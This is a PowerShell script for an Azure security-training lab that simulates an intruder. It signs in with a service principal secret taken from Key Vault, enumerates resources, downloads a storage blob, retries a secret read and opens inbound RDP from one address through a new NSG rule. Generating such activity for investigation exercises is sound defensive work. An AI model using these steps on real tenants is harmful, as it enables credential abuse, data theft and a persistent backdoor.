#requires -Version 5.1
<#
Cloud Slice lab script.
Designed for Skillable Cloud Platform LCA or any PowerShell host with Az modules.
#>

[CmdletBinding()]
param(
    [string] $SubscriptionId = "",
    [string] $TenantId = "",
    [string] $ResourceGroupName = "",
    [string] $SetupClientId = "",
    [string] $SetupClientSecret = "",
    [switch] $UseManagedIdentity,
    [switch] $AllowModuleInstall
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-Section {
    param([string] $Message)
    Write-Host ""
    Write-Host "==== $Message ===="
}

function Ensure-AzModule {
    param([string[]] $ModuleNames)

    foreach ($moduleName in $ModuleNames) {
        if (-not (Get-Module -ListAvailable -Name $moduleName)) {
            if (-not $AllowModuleInstall) {
                throw "Required module '$moduleName' was not found. Re-run with -AllowModuleInstall or preinstall Az modules in the LCA host."
            }

            Write-Host "Installing module $moduleName..."
            Install-Module -Name $moduleName -Scope CurrentUser -Force -AllowClobber -Repository PSGallery
        }

        Import-Module $moduleName -Force
    }
}

function Connect-CloudSliceAz {
    param(
        [string] $SubscriptionId,
        [string] $TenantId,
        [string] $ClientId,
        [string] $ClientSecret,
        [switch] $UseManagedIdentity
    )

    Write-Section "Authenticating to Azure"

    $existing = Get-AzContext -ErrorAction SilentlyContinue
    if ($existing -and [string]::IsNullOrWhiteSpace($ClientId) -and -not $UseManagedIdentity) {
        Write-Host "Using existing Az context: $($existing.Account.Id)"
    }
    elseif ($UseManagedIdentity) {
        Write-Host "Connecting with managed identity..."
        if ([string]::IsNullOrWhiteSpace($TenantId)) {
            Connect-AzAccount -Identity | Out-Null
        }
        else {
            Connect-AzAccount -Identity -Tenant $TenantId | Out-Null
        }
    }
    elseif (-not [string]::IsNullOrWhiteSpace($ClientId) -and -not [string]::IsNullOrWhiteSpace($ClientSecret) -and -not [string]::IsNullOrWhiteSpace($TenantId)) {
        Write-Host "Connecting with setup service principal..."
        $secureSecret = ConvertTo-SecureString $ClientSecret -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($ClientId, $secureSecret)
        Connect-AzAccount -ServicePrincipal -Tenant $TenantId -Credential $credential | Out-Null
    }
    else {
        throw "No usable authentication path found. Provide existing Az context, -UseManagedIdentity, or -TenantId/-SetupClientId/-SetupClientSecret."
    }

    if (-not [string]::IsNullOrWhiteSpace($SubscriptionId)) {
        Set-AzContext -SubscriptionId $SubscriptionId | Out-Null
    }

    $context = Get-AzContext
    if (-not $context) {
        throw "Azure authentication failed. No Az context is available."
    }

    Write-Host "Connected as: $($context.Account.Id)"
    Write-Host "Subscription: $($context.Subscription.Id)"
    Write-Host "Tenant: $($context.Tenant.Id)"

    return $context
}

function Get-CloudSliceResources {
    param([string] $ResourceGroupName)

    Write-Section "Discovering Cloud Slice resources"

    $storageAccounts = if ([string]::IsNullOrWhiteSpace($ResourceGroupName)) {
        Get-AzStorageAccount | Where-Object { $_.StorageAccountName -like "stcloudslice*" }
    }
    else {
        Get-AzStorageAccount -ResourceGroupName $ResourceGroupName | Where-Object { $_.StorageAccountName -like "stcloudslice*" }
    }

    $storage = $storageAccounts | Select-Object -First 1
    if (-not $storage) {
        throw "Could not find a storage account named stcloudslice*. Pass -ResourceGroupName if discovery is ambiguous."
    }

    $rgName = $storage.ResourceGroupName

    $vault = Get-AzKeyVault -ResourceGroupName $rgName | Where-Object { $_.VaultName -like "kv-cloudslice-*" } | Select-Object -First 1
    if (-not $vault) {
        throw "Could not find a Key Vault named kv-cloudslice-* in resource group '$rgName'."
    }

    $nsg = Get-AzNetworkSecurityGroup -ResourceGroupName $rgName | Where-Object { $_.Name -like "nsg-cloudslice-web-*" } | Select-Object -First 1
    if (-not $nsg) {
        Write-Warning "Could not find NSG named nsg-cloudslice-web-* in resource group '$rgName'. Attacker NSG activity will be skipped if this is script 04."
    }

    $staticSite = Get-AzResource -ResourceGroupName $rgName -ResourceType "Microsoft.Web/staticSites" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like "swa-cloudslice-*" } |
        Select-Object -First 1

    $resourceGroup = Get-AzResourceGroup -Name $rgName

    Write-Host "Resource group: $rgName"
    Write-Host "Storage account: $($storage.StorageAccountName)"
    Write-Host "Key Vault: $($vault.VaultName)"
    if ($nsg) { Write-Host "NSG: $($nsg.Name)" }
    if ($staticSite) { Write-Host "Static Web App: $($staticSite.Name)" }

    return [pscustomobject]@{
        ResourceGroup = $resourceGroup
        ResourceGroupName = $rgName
        Storage = $storage
        KeyVault = $vault
        NetworkSecurityGroup = $nsg
        StaticSite = $staticSite
    }
}

function Get-CurrentPrincipalObjectId {
    $context = Get-AzContext
    $accountId = $context.Account.Id

    $sp = Get-AzADServicePrincipal -ApplicationId $accountId -ErrorAction SilentlyContinue
    if ($sp) { return $sp.Id }

    $spByDisplay = Get-AzADServicePrincipal -DisplayName $accountId -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($spByDisplay) { return $spByDisplay.Id }

    $user = Get-AzADUser -UserPrincipalName $accountId -ErrorAction SilentlyContinue
    if ($user) { return $user.Id }

    Write-Warning "Could not resolve current principal object id for '$accountId'. Some role assignments may be skipped."
    return $null
}

function Ensure-RoleAssignment {
    param(
        [Parameter(Mandatory=$true)][string] $ObjectId,
        [Parameter(Mandatory=$true)][string] $RoleDefinitionName,
        [Parameter(Mandatory=$true)][string] $Scope
    )

    $existing = Get-AzRoleAssignment -ObjectId $ObjectId -RoleDefinitionName $RoleDefinitionName -Scope $Scope -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Host "Role already assigned: $RoleDefinitionName on $Scope"
        return
    }

    Write-Host "Assigning role: $RoleDefinitionName on $Scope"
    New-AzRoleAssignment -ObjectId $ObjectId -RoleDefinitionName $RoleDefinitionName -Scope $Scope -ErrorAction Stop | Out-Null
}

function Get-SecretTextFromCredential {
    param([object] $Credential)

    foreach ($propertyName in @("SecretText", "SecretValue", "Value")) {
        if ($Credential.PSObject.Properties.Name -contains $propertyName) {
            $value = $Credential.$propertyName
            if (-not [string]::IsNullOrWhiteSpace($value)) {
                return $value
            }
        }
    }

    throw "The app credential was created, but the secret text was not returned by the installed Az.Resources version."
}


Ensure-AzModule -ModuleNames @("Az.Accounts", "Az.Resources", "Az.KeyVault", "Az.Storage", "Az.Network")

$setupContext = Connect-CloudSliceAz -SubscriptionId $SubscriptionId -TenantId $TenantId -ClientId $SetupClientId -ClientSecret $SetupClientSecret -UseManagedIdentity:$UseManagedIdentity
$resources = Get-CloudSliceResources -ResourceGroupName $ResourceGroupName

Write-Section "Retrieving compromised identity from Entra and Key Vault"

$app = Get-AzADApplication -DisplayName "svc-cloudslice-deploy" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $app) {
    throw "Could not find app registration svc-cloudslice-deploy. Run script 01 first."
}

$secret = Get-AzKeyVaultSecret -VaultName $resources.KeyVault.VaultName -Name "svc-cloudslice-deploy-client-secret" -AsPlainText
if ([string]::IsNullOrWhiteSpace($secret)) {
    throw "Secret svc-cloudslice-deploy-client-secret was empty or unavailable. Run script 01 first and verify Key Vault access."
}

$tenantIdEffective = if ([string]::IsNullOrWhiteSpace($TenantId)) { $setupContext.Tenant.Id } else { $TenantId }
$subscriptionIdEffective = if ([string]::IsNullOrWhiteSpace($SubscriptionId)) { $setupContext.Subscription.Id } else { $SubscriptionId }

Write-Section "Signing in as compromised service principal"
Disconnect-AzAccount -ErrorAction SilentlyContinue | Out-Null

$secureSecret = ConvertTo-SecureString $secret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($app.AppId, $secureSecret)
Connect-AzAccount -ServicePrincipal -Tenant $tenantIdEffective -Credential $credential | Out-Null
Set-AzContext -SubscriptionId $subscriptionIdEffective | Out-Null

Write-Host "Authenticated as compromised identity: svc-cloudslice-deploy / $($app.AppId)"

Write-Section "Rediscovering resources as attacker"
$attackerResources = Get-CloudSliceResources -ResourceGroupName $resources.ResourceGroupName

Write-Section "Enumerating resources"
Get-AzResourceGroup -Name $attackerResources.ResourceGroupName | Out-Null
Get-AzResource -ResourceGroupName $attackerResources.ResourceGroupName | Out-Null
Get-AzStorageAccount -ResourceGroupName $attackerResources.ResourceGroupName -Name $attackerResources.Storage.StorageAccountName | Out-Null

Write-Section "Enumerating and reading storage blobs"
$storageContext = New-AzStorageContext -StorageAccountName $attackerResources.Storage.StorageAccountName -UseConnectedAccount
Get-AzStorageContainer -Context $storageContext | Out-Null
Get-AzStorageBlob -Context $storageContext -Container "business-files" -ErrorAction SilentlyContinue | Out-Null

$tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("CloudSliceAttacker-" + [guid]::NewGuid().ToString("n"))
New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
$downloadPath = Join-Path $tempRoot "deployment-notes.txt"

try {
    Get-AzStorageBlobContent -Context $storageContext -Container "business-files" -Blob "operations/deployment-notes.txt" -Destination $downloadPath -Force -ErrorAction Stop | Out-Null
    Write-Host "Downloaded business-files/operations/deployment-notes.txt"
}
catch {
    Write-Warning "Could not download deployment-notes.txt. This may mean script 02 has not run or RBAC has not propagated. $($_.Exception.Message)"
}

Write-Section "Attempting Key Vault secret read as attacker"
try {
    Get-AzKeyVaultSecret -VaultName $attackerResources.KeyVault.VaultName -Name "svc-cloudslice-deploy-client-secret" -AsPlainText -ErrorAction Stop | Out-Null
    Write-Host "Read Key Vault secret as compromised identity."
}
catch {
    Write-Warning "Key Vault secret read failed as compromised identity. This still creates useful investigation context if audit logging captures the attempt. $($_.Exception.Message)"
}

Write-Section "Creating suspicious NSG rule"
if ($attackerResources.NetworkSecurityGroup) {
    $nsg = Get-AzNetworkSecurityGroup -ResourceGroupName $attackerResources.ResourceGroupName -Name $attackerResources.NetworkSecurityGroup.Name
    $existingRule = $nsg.SecurityRules | Where-Object { $_.Name -eq "Allow-Temporary-RemoteAccess" }

    if (-not $existingRule) {
        $nsg | Add-AzNetworkSecurityRuleConfig `
            -Name "Allow-Temporary-RemoteAccess" `
            -Description "Temporary remote access exception" `
            -Access Allow `
            -Protocol Tcp `
            -Direction Inbound `
            -Priority 110 `
            -SourceAddressPrefix "198.51.100.23/32" `
            -SourcePortRange "*" `
            -DestinationAddressPrefix "*" `
            -DestinationPortRange "3389" | Out-Null

        $nsg | Set-AzNetworkSecurityGroup | Out-Null
        Write-Host "Created suspicious NSG rule: Allow-Temporary-RemoteAccess"
    }
    else {
        Write-Host "Suspicious NSG rule already exists: Allow-Temporary-RemoteAccess"
    }
}
else {
    Write-Warning "No NSG discovered. Skipping suspicious NSG rule creation."
}

Write-Section "Adding suspicious resource group tags"
$rg = Get-AzResourceGroup -Name $attackerResources.ResourceGroupName
$tags = @{}
if ($rg.Tags) {
    foreach ($key in $rg.Tags.Keys) {
        $tags[$key] = $rg.Tags[$key]
    }
}

$tags["RemoteAccessException"] = "Temporary"
$tags["ExceptionOwner"] = "svc-cloudslice-deploy"
$tags["ExceptionSource"] = "198.51.100.23"

Set-AzResourceGroup -Name $attackerResources.ResourceGroupName -Tag $tags | Out-Null

Write-Section "Complete"
Write-Host "Attacker activity generated."
Disconnect-AzAccount -ErrorAction SilentlyContinue | Out-Null
